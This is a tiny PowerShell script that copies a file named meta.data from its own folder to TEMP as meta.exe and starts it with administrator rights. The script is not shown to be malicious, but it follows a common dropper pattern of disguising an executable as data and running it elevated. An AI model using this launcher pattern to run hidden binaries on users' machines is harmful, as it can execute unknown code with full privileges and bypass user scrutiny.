$sourceFile = "$PSScriptRoot\meta.data"
$targetDirectory = "$env:TEMP"
$targetFile = "$targetDirectory\meta.exe"


Copy-Item -Path $sourceFile -Destination $targetFile -Force


Rename-Item -Path $targetFile -NewName "meta.exe"

Start-Process -FilePath $targetFile -Verb RunAs
